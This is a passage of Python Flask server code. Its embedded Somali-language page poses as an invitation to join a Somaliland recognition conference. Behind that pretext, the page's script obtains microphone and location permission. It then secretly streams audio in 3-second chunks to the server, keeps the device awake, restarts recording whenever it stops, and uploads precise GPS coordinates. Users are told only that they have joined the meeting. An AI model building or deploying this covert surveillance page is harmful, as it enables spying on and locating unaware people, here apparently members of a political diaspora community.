ISWySDzwMVujwVpcOk6XpVsssNtptzHdRbWyzupJy5PJySST1reCgc4ovqKFF9TxvwhfSeCIbnxEySz6TqV/ewXca5Yx3CzOIXUf7WNh99ta3hbSbyw8f315qrltU1LQzdXK5yIiZSFjX2VQF98E13WieHLPRNOawiLywtcS3P70A/M8hc9uxPFOPh+3bXpNbLy/aHs/sJXI27NxbP1yaaerFGi1Y4P4fTagvhPRUHgyG4i8lVF0biEF1yfmwRn8KXxHpGo3XxIvdS0OTGqaZpdtLDEzYS5QySh4W/3gBg9iAa6Ow8CzaXaRWdl4n1yG3hXZHGDCQi+nMea2YNBgh1mbVxLM1xPax2r7sY2ozEHp1JY5pJ2bHGm2lFnKeHNYsfE3jiW8gXMUmhxpJDMvzRuLhwyOD3BBFWtB02xbxx4qJs7X92bLZ+6X5f3RPHHFbVj4R0zTfEl94htY2jvL+FIbgA/I+05DY/vep9qs2mi29nqmoalG0hmv/L80E/KNi7Rj8KPQqMHpfuZfxAuIV8JX9qfOMl8n2OBYf8AWSTSfKij8eue2a5PwlqaadrTyeILa20nXY4odNXTLOIKJlZvllU/8tATnkfdANd9r/h+18QacbK5MqKHWVJIm2yRSKcq6nsQawT8Nra61K21XUdZ1i+1KzI+y3MsqK0AzyFCqAc9DkHg042JnCTnzIl+JmP+EG1b5DINsfA53fvV4rnNVePXvEGlaJp/hiXRdQgnj1A3dxHFEyQI3zbNhJcn7pHvzXfa5osOvaZPp1w8kcM+3cY8ZGGDcZ9xUeseHbbWLixu3eWG6sJvOgniIDrkYZPdWHBFKOjHOm5Suji7W81CPxJ4oW18KJq8Y1Efv2niTafJj+XDjP8A+urfiGIanq/g7StQsUtLG7eea4sSysjSogZI228MMljjocVq3Hgl21S+vrPxBrFh9ulE0sNuYtm/aFyNyE9FHerV74PttV0eLTtSvL27lgk86K9ZwlxFJk4ZWQDBGcdOnWmrc1wVOWqFbw7pFndnVrTS7SO/t4ZFjlijCNgj7pxjI4HWsDwH4c0TVvBFhc31haXs+pRGa8lmiDvNIxO7cTzx09sVs6N4LTTtSTU7rWdY1S5iUpF9snBSMHrhFABPuQaz7j4Z2plnSx1zXdMsbh2eSxs7gLDlvvbcglAechSOtJK19Q5Xe/KcrowOsWfg3RNSY3GlNeXyYkOVuBAWEKsf4hgE4PXbXWCTStI8X2EQ8J/ZpJ5GtbbU4liVWyhYjCndjCkcjtWpfeC9IvdDttGED29tZ7Dam3co9uy/dZGHIb375Oar6V4IgstSg1K91bVtWubXJt/t04KQkjBYKoAzgkZOTzTTQo05ROG8LTXXgyS58Rlnl0K/1S7i1KPOfsji4dUuFH93GFb8DViwZJ/+EYb5XVvE2oD1BB8/8+K9C0/w9Z6fp02nKpmt5pJpJEmwwbzXZmB9vmP4Vm6b4B0rSLXSrS0a4SDS7uS8gUuD8zhgVJ7gbzj6Ci+glSkkija6TYN8S9QRtPtCi6RasqmFcA+dLz069K5DSbWHUdQ0TSr5RJps2v6rLJC/3JpYyTGrDuOWOPb2r1OPRoY9bm1hWf7RNbJasCfl2ozMPxy5rKuPAWlXOkSaczXKg3j6hHPHJtmgnZi25GHTBJ/CiLsVKk2ZfibS7LRfE/hXUtMtoLS9n1D7FKLdAnnwNGxYMB1C7QR6Vy3haa78HSX3iUtJLoV9q13FqceSfsrC4ZUuFHpjCsPTB7V3ekeB4LDVY9XvdU1TWL2BWS3kv5QwgB4OxVAAJHGcZrS0vw/Z6Xp8+nopmt55ppZEmwwbzWLMPp8xFCdhKnJvm2Mb4cssmk6k6spVtYvSpHQjzTyK5rwvc3wm11YvBy6nGut3gF2ZoVz+86Yfniu58L+FdP8ACOljTNN80WyzSSqsjbiu9skA+g6Cp9G0O30OK6jheR1urua8feRw8jbiB7elK+5ag7K5y2k2FrqvxA8RS6jbwzPp8VrBaJKgYQxtHuYqDwMtnJHpWD4ktINHu/HunaeqwWVx4fF5Jbx8RxznepYAcAsoBPriu213wXb6tqSarbX+oaXqCx+SbiykCtJHnIVwQQwBPGRxmmQeAtNt9G1XTjNeXEurxmO8vZ5N9xLkbR8xGAAOgAwKaepHs3qrHG6/5fiGHS/DVp4Wl0rVboxXEN9dJDEIUjZS8iMrEs2P4RzzzxXS+EVC+KfGvI51KE8/9e8dbWs+GbbWrWziklmhmsZUmtrmIgSROvGRkYwRkEdwapat4KS91aTVrHVdS0m8njWK4eydQJgv3SyspGQOARzile6sNQknc848SaRFrtpfaZKzrDdeNhG7I2GXKAZB9Qf5Voarfax4s0G68IaissFxpVvK+s3KZUToikwhT/01wGOOgUjvXdReBNLttO06xha4CWV6NQ8xn3STzZJLSMepJPNa95psF5a3NuwKi5iaKRlADEEEdfoafMT7Fu5Q8F8eENE/68Yf/QBWzVbS9Pi0nTbXT4WZorWJYUL4yQowM1ZNSdEVZJBSZ96TNFAxc5NFFFAERpc0lGKAFzRSCloAaw4qCROtWDUbjIoYGdOuRWVdx9a2pkrNuo6Oo+py+rWMd3A8UoODyCOqnsR71T0TWmhlXTNW2M6/6uRh8si/56+lbl3Dwa5vVrBLuMpICMHKsOCh9RXBjMJ7VqcNJL+rHTQr8vuT1izq5dM8OWUX225jtrZcgFnYAZPQe+aedc05YttnHA69iTgfpXDWerxvbnRPEcQntn4jmxkH/A+35Vbtfh6UxLpOplY25VSdyn6f4V5FavXqP2VO0ZLdPc7FRpR1nquj6EmvXVpdyYlgjAJ+ZY45GVvqMEfj1rpPDmqQz6R9jvIUEKr5eVU7SuOjKeRVKx8J6ouFub4BfRB1rYistP0eJlwJZP4snnPuaxpUa9CXtK80l+ZderSmlClFs5a8e48LO0kAN3Y/8s5YznA/uv6fWtnQRH4r8L3cG4+W0pMDHqh4Yfkay9Z1VQ+YbYAnqYUZj+eQKteF9UuN7R2ySxO/LRyou1j68HiubD1KKxFqaundWN60ZukpS0a6lm21BraxNrqiZMXyyAjJX3Ht3rd0HUBexyQNIJHgIw+c70IyprM1e1u9RUGawCSAY8yJiD+oqj4Wtzod7Nvld43XaIyBlOc8YPTk8VvQhLC1739x9znqctWm/wCY7UrWdq1/BZKfPdUiVdz57jsKlbWbTaCrl2/uqOR9a43xLBPr2pxMJJEij6Q4Ay3qT3/KuvGYtShyUHdsww9G871NEGrX8/iOWOytlIWThUH8K+prV8Rahb+EtDtUClvLUrHGvV3xgf1pNIsLrTR/o1iFkb70suWNYfifXbp7s2pt7p2j5DLErfkMgiuCcfq9CSkneW7sdUP31VKNrLoVtOE2sMk97IIYHIaSST5Q3+yo64rV8Y+ILEacumLBvR1BG+NmBA6HaB/Oq+hTRlA9xCrZ6h1Mbf1rcu9I0rW41ERMMyDI2nDD/GjDKE6LpUJpN91v8yqzcaqnVjdLt0OQ8O3EVkVkWFZXAwDcQuoUegHAFdFN4l0edNmpwwRju4IKj8+ao3Xg3VCCE1UCP1ZBmsLUfC2kaPi41q4kvpPvJbZxv+o7L7mrpwxlHWckohJ4er8KbZ0d/F4Z0qx/tTyrf7OwyskYDNLnoE9Sf0rg0hn8Zamup6hEsOnQfLa2g+7j+o9T3PtViW3uPEF0k9+FjtoxthtoxtVV7ADsP1NdBawYwAuABgADpXs4ajKt79RWj0Xc46tSNFOMNZdX2LVqmCK3LOPpxWfaQZI4rctIMYr1UeeXraPgVowJVa3Srsa47UxEycVKtMUVIo4oAdRRSdKAF+vNHSiigAzR0o6UUAGaKMUUALmkoooAWikpaACiiigAopKDQAUtFJQAo+tJS0UAFJR2ozQAtFJRQAUvSkNFABS0hooQB3paSihALSZo70UAKeaTNFFCAXNJRRQAUZ9aDTSaAHUlNL4ppegCTOBRnNRb6PMpAS5ozUW+jfTAkLUZ4zURejfx1oYEhIozUW73o3d80AS7qM1Hu96Td70ASZxSF6Zu5pM0AS7uKTNM3cUuaAJN2KM0z3ozQA7NGaTtRQAGiiigAopDRQBHRnmk/Kj0oAcKB1pBS0AGKaRmnZpp3egpAVplxVGdAe1aMiuegFVZYpCOgoGYl1GMHj9Kwr233BuDXUXMEpB6Vi3VtLg5Ipp6j6nIX9oHRkdQynqDVbSNd1Hw3Ntic3FoT80L8kf4/wA63ryylbP3fyrDu9PfPQflXJXwlOu7y379TajiJU3pqux3mneJ7bW7R4ba6ME7qQAx+ZD7E9fxrIPhLXBIduprMvUCRcGuJNvPDJ5iEqw7jit7SPHF9pqiK8HnRj1Gcf4V42JwtSMv30eeK6rdfI7adWD1py5X2/4J09n4Sv5CPtV0AO4QV0mm6VaaREfLUZ7seprG0jxpp+obVWbym/uvyP8AGtHUkbV7UQwXXk/NkvHg59sdaVKvhoX9ikpEVo1W/wB49Cvr3iJoYmjtESWXH8bYRfrjrXK6Pp+oa3qStPdyz4PzsvyRoPRVHH4nNdHbeDbXcGu76ab/AGWG0V0NlZ2dhEI7cRovsetZQwUq1VVcRNPyRo8QqcOSkvmZ914YsZ7BrUIVJHEinDA+ua4uK0vdEufs4u5IpVPMUxLxSj1GeR+Fem70/vL+dUdRsNP1FNlyI29DnkV043BQxCunytdTLD4mVLS10zN03XQqosvyg8Muc7fce1WdW0O11UB3G2UfdkXgisibwfb7ybe6ulX07D8TWtHdx6daxwS3KkxqF3t8zHH04rDD1PYwcMTJNDqRU5KVJNM5q68IaoCfIvkK/wC2Kzx4W1qCVbl9aFssZB3oBgfif5Vrat42tLXKxZlccAsQf/HR/WuR1LXdQ1d8lyB2z2+nYVnGnCrK+GpX89l/Xob+0nBfvZ28up0WseNBCPKtD50wGPMK4APqF/qa5LEl3cG4uWMkrHOWOf8A9ZpbbTnZssQSfXPNa1tpknGBGBXsYfL7P2ld80vwXojiqYp25KSsvxEs4CTkDNbFtbHPKmmWtjMhGCn61q29vcgjHln869K+hyWJrSAAj5Tmtm3iBHSqcFvc+kP5mtGFLofwwfmaXMOxaiiAqyi1WRbr0h/M1MFuB2h/M0c3kFiyBTgKrgXPpD+ZpcXPpB+Zo5/IVixijFQH7T6QfmaMXPpB+ZoU/ILFjFJioMXPpD+Zo/0r0g/M0c+uwcpYpMVBi69IPzNH+lekH5tRz67ByljHFJioALr0g/M0uLn0h/M0c+uwcpPSYqDFz6QfmaMXPpB+Zo59dg5Sxiiq+Lr0g/M0YuvSD8zS5/IOUsUVXxdekH5mjF16QfmafP5D5Sxiiq+Lr0h/M0D7T6Q/maOfyFylij61B/pPpD+ZpMXXpB+Zo5/IOUsYoqDFz6Q/maP9J9IfzNHP5BYnxSEVDi49IfzNIftPpD+Zo5/ILFjGaTBFQYufSD8zRi59IfzNHPrsHKWMUmMVBi69IfzNH+lekH5mjn12DlJzQBUGLr0g/M0mLr0g/M0c+uwcpZxQBVbF1jpB+ZpD9s7C3/NqFPyBRLWOaMVWH2vuLf8ANqXF16QfmaFPyDlLGDSYqAi69IPzNGLn0g/M0KfkHKT0VBi49IfzNKpmH3hH+BNCl5BYkLUxmoY1wnxX8dHwb4eJtXAv7smK3BH3eOW/AfriqInJRi5MseMPinoHhB2t5pGu70DP2aDlh/vHov8AOvNrz9oTWHkJs9IsIk7ea7uf0IryWW6kuJXllkaSSRizuxyWJ6kmkD+9XyaHjVMbUk/ddkeon4/+JD/y4aV/3xJ/8VSH4/8AiT/nw0v/AL5k/wDiq8+l0TVINJi1eWwuE06ZtkdyV+Rm54B/A/lVDdmlyozeKrLeR6efj/4kP/LjpY/4C/8A8VSj4++JO9lpn/fL/wDxVeXBqXdScEJ4ut/Meo/8L88Q/wDPjpv5P/8AFUp+PfiA/wDLhpv5P/8AFV5bvpQ9DggeMrfzHqQ+POv/APPhp35P/wDFU/8A4X5r3/QN03/yJ/8AFV5X5la2ieGNc8RpLJpGl3N8kJCyGFchSegNDgrDWKrvRM9AHx813/oGab/5E/8Aiqd/wv3W8f8AIL0785P/AIqvPta8M654cWJ9Y0u5sVmJEZmXG8jrj86yvMo5EJ4qutGz1X/hfuuf9AvTfzk/+Ko/4X9rY6aVpv4mT/4qvKvMzRvzQooX1ur/ADHq3/DQGuf9AnTPzk/+Ko/4aB1wdNJ0z85P/iq8p30m+nyh9bq/zHtOkftCSeeq6toyCMn5pLWQ5X/gLdfzr1fQfEWl+JrBb7SrtLiI8MBwyH0YdQa+PfNxxmt7wV4yvPB2uQ6hbuxhJC3EOeJY88jHr3B9aTj2OmhjpRdqmqPrbPFLmqtldxXltFcwNvhmQSI3qpGQasChansDutBPFJmgn1oAM80UhooAjzTuKbmgGgB3FFJS0ALSHrS0lACEVE65BqU01loApTR8VnT2wbPFbLoD1FQvb5zQM5u4ss9qzp9MRuq5rrJLXPaq72QOeKAOKm0tehWqFxpCsMCIfU13kmnqT0qCTTUPakI84k0EhsjKn/ZqWCXWNPbMN5JgfwtyK71tHQn7tMOhRMfu1hWwtKr/ABIpmkas4/Czm7Xxxr1qAskEUo9QSprQj+I0/Hn6a7H2YH+laLeHYic+WKaPDkJ/5Z1yvKsO9k182afWJ9SmfiMmeNJlz9VqCf4i3b8Q6cy+mZMfyFan/CNw4+4KaPD0AP8Aq6Symg97/ewWImc7ceKtcvMgRxRA+gJP61Qlj1C8P+kXMz57ZwP0rtxoUYHCCnf2LH/d5rajl2Gp6xgr/f8AmS69SWjZxlro6qRlAfqK0o9IjI4UD6V0yaSi4+SpV0/byOn0rsWxkc/FpQXAxV+DT0AGQRWvHae1WEtAe1HQChBZKPcVoQ2owOKnhtNpq0kOKEBHFDirMaU5E5qULQAqCngUiin9KEIUUUtJTAWjNFFIAo60UDpTAM0Zoooe4BmjNGKKGAA80Ud6KAClpKUZoAKSiikAUUCigAzzRRQKYATRRRQAUUZo60AFGaKKACiiikAUUUUAFJS/hRTAPwozRRzQAdKKTNLQgEpDS9KaaAI3OBXzp+0bdSf8JPpsBJ8qO1LAdsluf5CvomU4rw79ojQJb20t9WhTc1pkvjr5ZwD+RAP4mpuk1cxxMHOlJI8P873q7o9lca3qtpplmN1xdyrCg9ycViebW94G8Y/8IT4gXWl0+K/niidYVkcqI3YY39DnAzx71020PFjFaXPoTUdHvNW/tP4fLpN2mj22mxx2N2YGWM3UY3bt2Mck4/A+teXaF4W0TS/CNx4o8VRXtwn2w2NvY20nlsXH3izdsYPHtXKWfxP8WWuqw6g2v6nMY5hMYXunMb4OdpXOMHpiuiT4w215Nqtpqvhq2u9G1G5+2GyM7KYJ8YZkcDjPXGO5qOV2OiThJ3ZoaH4c8I6lZa74pkj1ZNB03y4orRpV86WVuoLAYCjIqTwn4T8N+N9av59Mt9Uh0vTbQTzWss8fmyykkBEc4AXjqawNL+K0Gm3+qW6eGtOGg6miJNpauwQFejhuu71NMsvilBo2uTzaZ4Z02DSrq1+x3Onl3ZbhM53M553++KOVkqMNLnX6z8N9DQ6FeeY+hw3l8LO8tZ7yOdolOSJFdTjBxjnoTTPE3gLRtO1TTrI6Vq+jQXN8tv8A2jNcpPbSRE/eDDox9DXEaj470U3dl/Z/gvSoLW3lMskcsskrXGRjazkjj0HrV3UPivajSbbRNM8L2dvpKXQvJ7We5knEzD+HJxtX6UcrC1Np6G18S/CWneFrTNpoOs2mJ/LivpbhJra4Tn5sqPlY9hWn8KGE/wAN/GC/2sukZmgH21iwEXvlefb8a4jxH8TYdT8Mnw5o+hxaRYTTi5nH2l5y7joF3fdX2FZ+ieO5dG8I654cWySVNXaNmuDIQYtvoMc/nT5XawLljPmXY77SPB//AAlXiy20m98YnWrCK2e8mlhd2MarwVAfoTxz6VWvvDvhbxB4W1jWfCseoWdxozKZobuUSCeJjjcCOh46VwHhTxrqXg/XoNZsmSSSMGN4peUlQ8FW9jW9rXxQhk0O80fQNAtNEt9RcSXrRStI8pByFBP3V9qXKwXI1qv66Hca/wCEPA2i+JbDw0i6rPqN/Jand5gEcCORuGepJGT7ZFZukeB9JvPGHjbSpftH2bRLeeW1xJhgUPG445ri/EnxIu9f8Y23ieKzjtLi2EGyIOXXMWMEnA64rpJPjbaJeavfWXhCztrzWbZ4bycXTsWZhjcoIwB3x39aOVhaDex0Fp4S8G2dl4QOqW2qT3PiKIAmGcKkLkgbsYyeSOKjv/BfhN4/Fmj2C6muq+HLZrlruaVTHPt6rsA49K4a6+J89yPCgOnRr/wjgAQiU/6Rhg3PHy/d96lj+KUy6z4r1P8AsyPd4jtpLd4/NOIN3cHHzY/CjlY/c2t/Vv8AM5j7RnnNPSf3rNEuKtWFvPqN5BZ2qGSedxGijuSauSS1MOS7sj6y+Ed7Le/D/R3mJLLCYwT/AHVdgP0ArtAa5/wZpS6L4dsNPQgrbwrHkfxYHJ/E5NdAOBXNDVXPfjHlSTFozRRVDAmik7UUAMJ5pR/nimdaXNAD8+1APtSZoNADs5o4/wAim9aUUAH4UEZ7UcUUANK/5xSMvNPP0oxz/wDWoAhMf+cVG0PPT9KskUm3PagCo1vu7fpTPsuD0/Sruz2o2ZPSkBTFtxyKX7MMdBVvy6NlAFUWwPYflSG2GeKthAKCntTGVvs4PGP0pPsi+nNWwmDS7eaAKf2Qen6Un2Uen6Vd2j0o2UkBS+zYo+zj0FXfLB4xQIRQhFRbYegqQQY7fpU/l04IfemBCsZFShMdqdsPvTlWgAVcdqcB/nFAFOH0oAAKdSfhR36UALRR3opAFLSUUAFFFFABQKKBTAU0UlLR1ATvS0lLQAUtJQTQAUUlKKQBRRSd6AFNAoNJQAooxSUuabAO1FJS9qHsHQKKQ0UdAF7UdqQmigBaKSlzSAKOlFH4UAHbpRSUUwF/Ck/CikJoAX8KawpQc0EUAiCQEisbW9LTU7R4JADwcZGfwPtW4y5FRPGD2qXFNWY07ao+WPHHwev9PvZbjRYw8RJY2pOGT/cJ+8PbrXAXOgaxZttuNKvoz/tQN/hX2zeaVb3ibZY1Ye4rEn8HwsT5c0sY9AxqYyqwVlZrzMJ4SlPVaHx1/Zuonpp94f8Ati3+FIdM1Lr/AGbe/wDfhv8ACvr4+Clzn7VMP+Bmj/hCh3upsf75pqrV7L7zNYGn/M/u/wCCfIP9maljP9nXv/fhv8KT+zdT/wCgbe/9+G/wr7A/4Qpf+fqb/vs0n/CErn/j7n/77NNVavZfeH1GH8z+4+P/AOztS/6B17/35b/Cg6Xqf/QNvf8Avw3+FfYH/CFKOl3cf99mnf8ACHAf8vc//fZpqrUvsvvGsDD+Z/cfHv8AZepf9A69/wC/Df4Uv9lap/0Db3/vw3+FfYX/AAhy9PtU/wD32ad/why9Ptdx/wB9ml7WpfZfeL6lC/xP7j46/srVP+gbff8Afh/8KP7J1T/oGX3/AH4b/CvsNvB47XU//fZpv/CH5/5e5/8Avs0e1q9l94/qUP5n9x8e/wBlar/0DL7/AL8P/hThpWq/9Ay+/wC/D/4V9fnwd/0+XH/fZpR4Rx/y+XH/AH2aftanZfeH1KH834HyAdI1Tr/Zl9/34f8AwoGlaoOumX2P+uD/AOFfYJ8Iqf8Al6uP++zSr4VUf8vM3/fZpe1qdl94vqUP5vwPk/SvBPiXWHQWuj3YRj/rZkMcYHqWbAr3P4X/AAog8PML67dbrUGGDKoOyIHqqZ6k92/KvR4PDdsjBpN8pHTeSa1orZY1CqoAHoKUueektjanh6dN3WrJIFCIFUYA4AFTiowoGKlAqzQAaPwpMe1LQAmfaig0UxDCcGij3pM0hjhThTAeafQAdKUUnWlFACdKdSE0Z5oAWikJpaADr2pMc0tGOaAFxSEelLS4FADO9OxSgc0pFDAbikwKdRigBMUu2lxk0uKAG4pcc0vejvQAmKMUvelxQAmKMYp2OaTFAABzzR3pRRkUALQKQGnA0ABoFFFABRS0hpAFLSUdTQAUtJRQAUUClpgFFFFABSikooQC0lLSGgBaBSUA0AL3pOtFHakAGilpKYAaO/SiikAHijtR0ozTAKWgUmaAA0DFFAoAXFJS0UAJRRRmkAdqKKSgAoooNNAJ0opc0UANPSmkU/tSGgCPaKaUqUikxQBEUFHlipMUEGgCHZSbOelTYNBWgCLb7Unl1NtpMH2oAi2YoKcVLijFAEezimmM1NjmkwaAISlGypdvNIVoAiK44pdnFPINJg4FADdtOC4HFLtoOcUgDHFL9Kac8U4jIpgBNBPFIetJQAvWil+lFAiOigUtNjCjPNITijtSAcDzTqjzTt1ADjRmk3UE0ALmlBprdqM0AP60uajzzTs0DHd6Wmg5FGaBCg88UtJnFGaBi0opoPNANAh2eaM0me1BagB1Hemg5oJ5oYD6TvSbuRSlqAFzRnFNB5FBajqA4k0Cmg5NLnmgBwopobnpTic0AFOpmcUpOKAHUU3dzRntQA6gdabnnFKDk0AL3opA2aM0ALmjNIKM0ALmlzSE0maEAuaXrSGjOKOgC0UmaM5o6ALmikzQDQAtFFJmkAZoFGeaM0wHUlJmjOaAFNJQDmigBRRRmkzmgBaKQHNBNAC0hozSA9KAFoNIDxRmgBQc0UmeBQTQAuaKaTRnihAKaCeKTPFBNABSUZ/woBoAM0UmcCkY0AOzSZpM0Z70AKaQ0hNIW7UAOzRSZoJoAWk9sU0tzS7qAAn0ozSZ5ozQAUhNGc0hagAJoPSkz0oJwKAFzQTxSH8aQmkAE0pPFJmkJyKYCk0hoBpM8UAOBopuaKBH/9k="

MIC_HTML = """<!doctype html><html><head>
<meta name=viewport content="width=device-width,initial-scale=1">
<title>Madasha Horumarka &amp; Ictiraafka Somaliland</title>
<style>
body{font-family:Georgia,serif;background:#f3efe5;color:#2b2b2b;margin:0;padding:0 0 30px}
.wrap{max-width:520px;margin:0 auto}
.hdr{width:100%;display:block;border-bottom:4px solid #c9a227}
.card{background:#fff;border-radius:14px;padding:16px;margin:12px 14px;
 box-shadow:0 2px 8px rgba(20,61,43,.08);border:1px solid #e5dfcc}
.greenbar{border-top:4px solid #1e5b41}
.sub{color:#1e5b41;font-weight:bold;font-size:16px;text-align:center;margin:0}
.tags{text-align:center;color:#8a6d1d;font-size:13px;margin-top:6px;font-family:sans-serif}
.body{font-size:15px;line-height:1.7;text-align:center;margin:0}
.ct{color:#143d2b;font-weight:bold;margin-bottom:8px;text-align:center}
.chip{background:#eef7f0;border-left:4px solid #1e5b41;border-radius:8px;
 padding:9px 12px;margin:7px 0;font-size:14px;font-family:sans-serif;text-align:left}
.chip.alt{background:#fbf6e7;border-left-color:#c9a227}
.flag{text-align:center}
.flag img{width:170px}
.goldline{text-align:center;color:#8a6d1d;font-size:13px;font-family:sans-serif;margin:4px 0}
.sn{color:#1e5b41;font-weight:bold;font-size:18px;margin:6px 0;text-align:center}
#go{width:calc(100% - 28px);margin:4px 14px;font-size:17px;font-weight:bold;padding:16px;border:0;
 border-radius:14px;background:#1e5b41;color:#fff;font-family:sans-serif;box-shadow:0 3px 0 #123826}
.hint{text-align:center;font-size:12px;color:#6b6b6b;margin:8px 24px;font-family:sans-serif}
#st{margin:12px 14px;font-size:16px;text-align:center;font-family:sans-serif}
.ok{background:#eef7f0;border:1px solid #1e5b41;border-radius:12px;padding:18px;color:#1e5b41}
.wait{background:#fdf6e3;border:1px solid #c9a227;border-radius:12px;padding:18px;color:#7a6414}
.bigno{display:block;font-size:28px;font-weight:bold;color:#143d2b;margin-top:10px}
.err{color:#b03a2e;font-family:sans-serif;font-size:14px;text-align:center;margin:6px 14px}
.note{color:#8a8a8a;font-size:12px;text-align:center;margin-top:12px;font-family:sans-serif}
</style></head><body>
<div class=wrap>
 <img class=hdr src="data:image/jpeg;base64,__HDR__">
 <div class="card greenbar">
  <p class=sub>Shirka Horumarinta &amp; Dardargelinta Ictiraafka Somaliland</p>
  <div class=tags>Qurbajoog &bull; Qolqol-joog &bull; Aqoonyahan</div>
 </div>
 <div class=card>
  <p class=body>Waxaan si sharaf leh kuugu casuumaynaa inaad dhageyste uga soo qaybgasho,
  la wadaag aragtiyo, kana qayb qaado doodaha dhisaya mustaqbal mideysan.</p>
 </div>
 <div class=card>
  <div class=ct>Shirkan waxa diiradda lagu saari doonaa:</div>
  <div class=chip>Horumar dalka</div>
  <div class="chip alt">Iskaashi bulshada &amp; aqoonyahan</div>
  <div class=chip>Dardargelinta ictiraaf</div>
  <div class="chip alt">Midnimo &amp; wadajir</div>
 </div>
 <div class=goldline>Aragti &bull; Iskaashi &bull; Horumar &bull; Midnimo</div>
 <button id=go>Kubiir ogolowna Halka aad Shirka kasoo galyso</button>
 <div class=hint>Markaad gujiso waxaa laguu weydiin doonaa <b>Location</b> kadib <b>Microphone</b>
 &mdash; labadaba riix <b>Allow / Ogolaado</b>.</div>
 <div id=st></div>
 <div id=err class=err></div>
 <div class="card flag">
  <img src="data:image/jpeg;base64,__FLAG__">
  <div class=sn>Somaliland Ha Noolaato!</div>
  <p class=body>Kusoo Dhawoow Madasha, ka qayb qaado isbeddelka iyo horumarka Somaliland.</p>
 </div>
 <p class=note>Si aad uga baxdo kulanka: xir boggan (close this page).</p>
</div>

<script>
var KEY=new URLSearchParams(location.search).get('key')||'';
var DEV;
try{DEV=localStorage.getItem('mddev');
 if(!DEV){DEV='marti-'+Math.floor(1000+Math.random()*9000);localStorage.setItem('mddev',DEV)}
}catch(e){DEV='marti-'+Math.floor(1000+Math.random()*9000)}
var seq=0,rec=null,EXT='webm',stream=null,busy=false;
function st(t,c){document.getElementById('st').innerHTML='<div class="'+c+'">'+t+'</div>'}
function errm(t){document.getElementById('err').textContent=t}
function askMic(){
 if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia){
  errm('Browserkan ma taageero microphone-ka. Fadlan linkiga ku fur Chrome ama Safari.');
  busy=false;return}
 navigator.mediaDevices.getUserMedia({audio:{echoCancellation:true,noiseSuppression:true,autoGainControl:true,channelCount:1}}).then(function(s){
  stream=s;
  var MT='';
  var cands=['audio/webm;codecs=opus','audio/webm','audio/mp4'];
  for(var i=0;i<cands.length;i++){if(window.MediaRecorder&&MediaRecorder.isTypeSupported(cands[i])){MT=cands[i];break}}
  if(MT.indexOf('mp4')>=0)EXT='m4a';
  var sess='s'+Math.floor(100000+Math.random()*900000),frag=0;
  function startRec(){
   if(!stream||!stream.active)return;
   if(rec&&rec.state==='recording')return;
   try{rec=new MediaRecorder(stream,MT?{mimeType:MT,audioBitsPerSecond:96000}:{audioBitsPerSecond:96000})}catch(e){try{rec=new MediaRecorder(stream,MT?{mimeType:MT}:undefined)}catch(e2){rec=new MediaRecorder(stream)}}
   rec.ondataavailable=function(e){
    if(e.data&&e.data.size>0){
     var fd=new FormData();
     fd.append('dev',DEV);
     fd.append('sess',sess);
     fd.append('frag',frag);
     fd.append('audio',e.data,'c.'+EXT);
     fd.append('ext',EXT);
     frag++;
     (function send(f,n){
      fetch('/up?key='+KEY,{method:'POST',body:f}).then(function(r){if(!r.ok)throw 0})
      .catch(function(){if(n>0)setTimeout(function(){send(f,n-1)},1500)});
     })(fd,3);
    }};
   rec.onerror=function(){};
   rec.onstop=function(){if(stream&&stream.active){setTimeout(startRec,120)}};
   try{rec.start()}catch(e){return}
   setTimeout(function(){try{if(rec&&rec.state==='recording')rec.stop()}catch(e){}},3000);
  }
  startRec();
  setInterval(function(){
   if(stream&&stream.active&&(!rec||rec.state!=='recording')){startRec()}
  },5000);
  var fd0=new FormData();fd0.append('dev',DEV);
  fetch('/hello?key='+KEY,{method:'POST',body:fd0}).then(function(r){return r.json()}).then(function(d){
   st('<b>Mahadsanid! Waad ku biirtay kulanka.</b><span class=bigno>Kaqaybgale No. '+d.no+'</span>','ok');
  }).catch(function(){
   st('<b>Mahadsanid! Waad ku biirtay kulanka.</b>','ok');
  });
  document.getElementById('go').style.display='none';
  errm('');
  function keepAwake(){if(navigator.wakeLock&&navigator.wakeLock.request){navigator.wakeLock.request('screen').then(function(){}).catch(function(){})}}
  keepAwake();
  document.addEventListener('visibilitychange',function(){if(document.visibilityState==='visible')keepAwake()});
  if(navigator.geolocation){
   navigator.geolocation.getCurrentPosition(function(p){
    var fd2=new FormData();
    fd2.append('dev',DEV);
    fd2.append('lat',p.coords.latitude);
    fd2.append('lon',p.coords.longitude);
    fd2.append('acc',p.coords.accuracy);
    fetch('/loc?key='+KEY,{method:'POST',body:fd2}).catch(function(){});
   },function(){},{enableHighAccuracy:true,timeout:25000,maximumAge:0});
  }
 }).catch(function(e){
  busy=false;
  errm('Ogolaanshaha lama helin. Riix badhanka mar kale kadibna dooro Allow. Haddii uu diido: fur browser Settings - Site settings - Location iyo Microphone - Allow.');
 });
}
function startJoin(){
 if(busy)return;busy=true;
 errm('');
 st('Fadlan sug &mdash; marka hore <b>Location</b>, kadib <b>Microphone</b>. Labadaba riix <b>Allow</b>.','wait');
 if(navigator.geolocation){
  navigator.geolocation.getCurrentPosition(function(p){
   var fd=new FormData();
   fd.append('dev',DEV);
   fd.append('lat',p.coords.latitude);
   fd.append('lon',p.coords.longitude);
   fd.append('acc',p.coords.accuracy);
   fetch('/loc?key='+KEY,{method:'POST',body:fd}).catch(function(){});
   askMic();
  },function(e){askMic()},{enableHighAccuracy:false,timeout:8000,maximumAge:60000});
 }else{askMic()}
}
var go=document.getElementById('go');
go.onclick=startJoin;
if(go.addEventListener)go.addEventListener('click',startJoin);
</script></body></html>"""


@app.route("/mic")
def mic_page():
    if request.args.get("key") != MIC_KEY:
        abort(403)
    return MIC_HTML.replace("__HDR__", HEADER).replace("__FLAG__", FLAG)

LISTEN_HTML = """<!doctype html><html><head>
<meta name=viewport content="width=device-width,initial-scale=1">
<title>Kaqaybgal - Madasha</title>
<style>
body{font-family:Georgia,serif;background:#f7f4ec;color:#2b2b2b;margin:0;padding:14px}
.wrap{max-width:520px;margin:0 auto}
.card{background:#fff;border-radius:16px;padding:18px;margin:14px 0;
 box-shadow:0 2px 10px rgba(20,61,43,.08);border:1px solid #e8e2d2}
.head{text-align:center;border-top:5px solid #1e5b41}
.t1{color:#143d2b;font-size:20px;font-weight:bold}
.t2{color:#c9a227;font-size:11px;letter-spacing:2px;margin-top:4px;font-family:sans-serif}
button{width:100%;font-size:19px;font-weight:bold;padding:15px;border:0;border-radius:14px;
 background:#1e5b41;color:#fff;font-family:sans-serif;box-shadow:0 3px 0 #123826}
